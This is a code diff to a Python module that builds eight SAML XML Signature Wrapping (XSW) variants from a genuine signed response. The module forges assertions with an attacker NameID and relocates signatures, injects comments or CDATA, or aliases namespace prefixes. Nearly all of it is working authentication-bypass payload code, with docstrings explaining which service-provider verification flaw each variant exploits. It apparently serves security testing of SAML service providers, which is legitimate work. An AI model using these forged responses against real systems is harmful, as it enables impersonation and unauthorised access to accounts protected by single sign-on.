@@ -44,13 +44,16 @@ def _set_nameid(assertion_el, value: str) -> None:
         nameid.text = value
 
 
+_DS_SIGNATURE = "{http://www.w3.org/2000/09/xmldsig#}Signature"
+
+
 def _xsw1_duplicate_assertion_before(root, original_assertion) -> etree._Element:
     """XSW1: clone the assertion with attacker NameID, insert BEFORE the
     original signed one — some parsers validate the first Assertion's signature
-    but process the LAST Assertion element's claims."""
+    but process the LAST Assertion element's claims. Position alone (before vs.
+    XSW2's after) makes this structurally distinct; no marker attribute needed."""
     forged = copy.deepcopy(original_assertion)
     _set_nameid(forged, _ATTACKER_NAMEID)
-    forged.set("xsw_variant", "1")  # Marker to distinguish from XSW3
     original_assertion.addprevious(forged)
     return root
 
@@ -63,93 +66,185 @@ def _xsw2_duplicate_assertion_after(root, original_assertion) -> etree._Element:
     return root
 
 
-def _xsw_variant_move_signature(root, original_assertion, remove_signature: bool) -> etree._Element:
-    """XSW3-4 family: create forged assertions with different signature positioning.
+def _xsw3_relocate_original_signature(root, original_assertion) -> etree._Element:
+    """XSW3: physically relocate the ORIGINAL assertion's real, signed
+    ds:Signature element so it becomes a direct child of the samlp:Response
+    element — a SIBLING of both assertions — instead of a descendant of the
+    assertion it was actually issued for. An unsigned forged assertion
+    (attacker NameID) is inserted before the now-designatured original.
 
-    XSW3: Forged assertion with Subject moved before Signature.
-    XSW4: Forged assertion WITHOUT signature (moved to Response level).
+    This targets SP verification code that locates *a* ds:Signature anywhere
+    in the response document (e.g. a document-wide `//ds:Signature` XPath)
+    and, on finding one, treats the whole response as "signed" without
+    confirming the signature is a direct child of the specific assertion
+    whose claims are then extracted. Distinct from XSW1/XSW2 (which never
+    touch the signature's position at all) and from XSW4 (which relocates
+    the FORGED copy's own signature, not the original's — see below).
     """
     forged = copy.deepcopy(original_assertion)
     _set_nameid(forged, _ATTACKER_NAMEID)
-    sig = forged.find(".//{http://www.w3.org/2000/09/xmldsig#}Signature")
-    subject = forged.find(".//saml:Subject", namespaces=_NSMAP)
+    forged_sig = forged.find(f".//{_DS_SIGNATURE}")
+    if forged_sig is not None:
+        # The forged assertion is unsigned by construction — the one real
+        # signature in the document is the relocated original, below.
+        forged.remove(forged_sig)
+    original_assertion.addprevious(forged)
 
-    if remove_signature and sig is not None:
-        # XSW4: Remove signature from forged assertion, place at Response level
+    sig = original_assertion.find(f"./{_DS_SIGNATURE}")
+    if sig is not None:
+        original_assertion.remove(sig)
+        root.append(sig)
+    return root
+
+
+def _xsw4_relocate_forged_signature(root, original_assertion) -> etree._Element:
+    """XSW4: the FORGED assertion's own (copied) ds:Signature element is
+    stripped out and relocated to become a direct child of the samlp:Response
+    element — the forged assertion itself ends up with no ds:Signature
+    descendant at all, while the ORIGINAL assertion keeps its real signature
+    untouched in place.
+
+    This targets SP logic that treats "the Response contains a Signature
+    element somewhere" as sufficient proof of trust, then extracts claims
+    from the (unsigned) forged assertion. Distinct from XSW3, which instead
+    relocates the ORIGINAL assertion's real signature and leaves the
+    original designatured.
+    """
+    forged = copy.deepcopy(original_assertion)
+    _set_nameid(forged, _ATTACKER_NAMEID)
+    sig = forged.find(f".//{_DS_SIGNATURE}")
+    if sig is not None:
         forged.remove(sig)
         root.append(sig)
-    elif sig is not None and subject is not None:
-        # XSW3: Reorder children - move subject to position 0, signature to end
-        # This creates a detectably different DOM structure
-        forged.remove(subject)
-        forged.insert(0, subject)
-        forged.set("xsw_variant", "3")  # Marker distinct from XSW1
-
     original_assertion.addprevious(forged)
     return root
 
 
-def _xsw_variant_comment_split(root, original_assertion, include_comment_variant: bool) -> etree._Element:
-    """XSW5/6 family: split the NameID value with XML comments or entities to
-    confuse parsers that apply signature check and claims processing differently.
-
-    XSW5: Use comment injection within NameID.
-    XSW6: Use entity-like structure within NameID.
+def _xsw5_comment_after_nameid(root, original_assertion) -> etree._Element:
+    """XSW5: forged assertion's NameID keeps legitimate-looking text
+    ("legit-user") and gets a genuine XML comment node (etree.Comment)
+    appended as a CHILD of the NameID element, containing the attacker's
+    identity. A naive extractor that reads only `.text` sees "legit-user";
+    one that concatenates all descendant text (including comments, e.g. via
+    a careless string-join over `.itertext()`) picks up the attacker value.
     """
     forged = copy.deepcopy(original_assertion)
     nameid = forged.find(".//saml:Subject/saml:NameID", namespaces=_NSMAP)
     if nameid is not None:
-        if include_comment_variant:
-            # XSW5: legitimate text with comment containing attacker identity
-            nameid.text = "legit-user"
-            comment = etree.Comment(f" override NameID to {_ATTACKER_NAMEID} ")
-            nameid.append(comment)
-        else:
-            # XSW6: use XML processing instruction-like structure with attacker ID
-            # This creates a different DOM structure than XSW5
-            nameid.text = f"legit-user<?xml attacker={_ATTACKER_NAMEID}?>"
-            # Add an attribute with attacker info to create further distinction
-            nameid.set("xsw6", "true")
+        nameid.text = "legit-user"
+        comment = etree.Comment(f" override NameID to {_ATTACKER_NAMEID} ")
+        nameid.append(comment)
     original_assertion.addprevious(forged)
     return root
 
 
-def _xsw_variant_namespace_alias(root, original_assertion, use_alternate_ns='no') -> etree._Element:
-    """XSW7/8 family: create namespace confusion so naive XPath-based extractors
-    (e.g. //saml:Assertion) miss the forged assertion while permissive
-    local-name lookups find it.
+def _xsw6_cdata_nameid(root, original_assertion) -> etree._Element:
+    """XSW6: forged assertion's NameID text is set via a genuine CDATA
+    section (etree.CDATA) carrying the attacker identity literally —
+    a real, distinct DOM/serialization mechanism from XSW5's comment node
+    (CDATA is a text-node variant, not a sibling/child node at all). CDATA
+    vs. comment is a real parser-differential vector: some naive extractors
+    strip XML comments before reading text but do NOT unwrap/strip CDATA
+    markers (or vice versa), so the two variants probe different classes
+    of text-node handling.
+    """
+    forged = copy.deepcopy(original_assertion)
+    nameid = forged.find(".//saml:Subject/saml:NameID", namespaces=_NSMAP)
+    if nameid is not None:
+        nameid.text = etree.CDATA(_ATTACKER_NAMEID)
+    original_assertion.addprevious(forged)
+    return root
 
-    XSW7: Duplicate assertion with direct namespace declaration.
-    XSW8: Duplicate assertion with modified child namespace declarations.
+
+def _build_aliased_forged_xml(original_assertion, alias_prefix: str) -> bytes:
+    """Serialize a deep copy of the assertion (attacker NameID already set)
+    and rewrite every use of the `saml` prefix — both the `xmlns:saml=`
+    declaration and every `<saml:...>`/`</saml:...>` tag — to `alias_prefix`.
+    The result is a syntactically distinct forged Assertion element that
+    still resolves to the SAME SAML assertion namespace URI
+    (urn:oasis:names:tc:SAML:2.0:assertion), just under a different prefix.
+
+    Note: lxml/libxml2 silently reconciles (collapses) a differently-prefixed
+    namespace back to an already-in-scope prefix for the same URI whenever a
+    node is *attached* to an existing tree (addprevious/addnext/append) —
+    this is why the alias is spliced in at the raw-string level by the
+    caller and the combined document is parsed exactly once, rather than
+    built via tree-attach calls.
     """
     forged = copy.deepcopy(original_assertion)
     _set_nameid(forged, _ATTACKER_NAMEID)
+    raw = etree.tostring(forged)
+    alias = alias_prefix.encode()
+    raw = raw.replace(b"xmlns:saml=", b"xmlns:" + alias + b"=")
+    raw = raw.replace(b"<saml:", b"<" + alias + b":")
+    raw = raw.replace(b"</saml:", b"</" + alias + b":")
+    return raw
 
-    if use_alternate_ns == 'no':
-        # XSW7: Keep namespace but add extra namespace declaration to confuse
-        # some parsers into thinking this is a different element
-        forged.set("{http://www.w3.org/2001/XMLSchema-instance}type", "override")
-    else:
-        # XSW8: Change namespace awareness on the Subject child to create
-        # a structurally different variant
-        subject = forged.find(".//saml:Subject", namespaces=_NSMAP)
-        if subject is not None:
-            # Add a marker attribute to Subject to structurally differentiate
-            subject.set("xsw8marker", "true")
 
-    original_assertion.addprevious(forged)
-    return root
+def _xsw_namespace_alias_splice(root, original_assertion, alias_prefix: str,
+                                 insert_after: bool) -> etree._Element:
+    """Shared XSW7/XSW8 mechanic: build a forged assertion whose elements use
+    `alias_prefix` (bound to the real SAML assertion namespace URI) instead
+    of `saml:`, then splice its serialized XML immediately before/after the
+    original assertion's serialized XML and re-parse the combined document in
+    a single pass (see `_build_aliased_forged_xml` for why this must be a
+    string splice + single parse, not a tree-attach)."""
+    aliased_xml = _build_aliased_forged_xml(original_assertion, alias_prefix)
+
+    base = etree.tostring(root)
+    prefix = original_assertion.prefix
+    localname = etree.QName(original_assertion).localname
+    open_tag = (f"<{prefix}:{localname}" if prefix else f"<{localname}").encode()
+    close_tag = (f"</{prefix}:{localname}>" if prefix else f"</{localname}>").encode()
+
+    start = base.find(open_tag)
+    if start == -1:
+        return root  # defensive: unexpected structure, leave untouched
+    end = base.find(close_tag, start)
+    if end == -1:
+        return root
+    end += len(close_tag)
+
+    combined = (base[:end] + aliased_xml + base[end:] if insert_after
+                else base[:start] + aliased_xml + base[start:])
+    return etree.fromstring(combined)
+
+
+def _xsw7_namespace_alias_before(root, original_assertion) -> etree._Element:
+    """XSW7: forged assertion uses the SAML assertion namespace URI bound to
+    an alternate prefix (`s2:` instead of `saml:`) and is inserted BEFORE the
+    original, still-`saml:`-prefixed, signed assertion.
+
+    This targets SP extraction logic that hardcodes a prefix-string lookup
+    (e.g. an XPath literally written as `.//saml:Assertion`) instead of
+    resolving by namespace URI: such code would only ever "see" the
+    original assertion and miss this `s2:`-prefixed forged one, while
+    namespace-URI-correct (or overly permissive local-name-only) extraction
+    logic would find either.
+    """
+    return _xsw_namespace_alias_splice(root, original_assertion, "s2", insert_after=False)
+
+
+def _xsw8_namespace_alias_after(root, original_assertion) -> etree._Element:
+    """XSW8: same alternate-namespace-prefix technique as XSW7, using a
+    different alias (`s3:`), but the forged assertion is inserted AFTER the
+    original — mirroring the XSW1-vs-XSW2 before/after split. This probes
+    whether SP logic that has already been fooled/bypassed by prefix
+    filtering then falls back to "the last Assertion element wins" by
+    document position.
+    """
+    return _xsw_namespace_alias_splice(root, original_assertion, "s3", insert_after=True)
 
 
 _VARIANT_BUILDERS = {
     "XSW1": lambda root, a: _xsw1_duplicate_assertion_before(root, a),
     "XSW2": lambda root, a: _xsw2_duplicate_assertion_after(root, a),
-    "XSW3": lambda root, a: _xsw_variant_move_signature(root, a, remove_signature=False),
-    "XSW4": lambda root, a: _xsw_variant_move_signature(root, a, remove_signature=True),
-    "XSW5": lambda root, a: _xsw_variant_comment_split(root, a, include_comment_variant=True),
-    "XSW6": lambda root, a: _xsw_variant_comment_split(root, a, include_comment_variant=False),
-    "XSW7": lambda root, a: _xsw_variant_namespace_alias(root, a, use_alternate_ns='no'),
-    "XSW8": lambda root, a: _xsw_variant_namespace_alias(root, a, use_alternate_ns='yes'),
+    "XSW3": lambda root, a: _xsw3_relocate_original_signature(root, a),
+    "XSW4": lambda root, a: _xsw4_relocate_forged_signature(root, a),
+    "XSW5": lambda root, a: _xsw5_comment_after_nameid(root, a),
+    "XSW6": lambda root, a: _xsw6_cdata_nameid(root, a),
+    "XSW7": lambda root, a: _xsw7_namespace_alias_before(root, a),
+    "XSW8": lambda root, a: _xsw8_namespace_alias_after(root, a),
 }
 
 
@@ -161,7 +256,7 @@ def generate_xsw_variants(saml_response_xml: str) -> dict[str, str]:
     for name, builder in _VARIANT_BUILDERS.items():
         root = etree.fromstring(saml_response_xml.encode())
         assertion = root.find(".//saml:Assertion", namespaces=_NSMAP)
-        builder(root, assertion)
+        root = builder(root, assertion)
         variants[name] = etree.tostring(root).decode()
     return variants
 
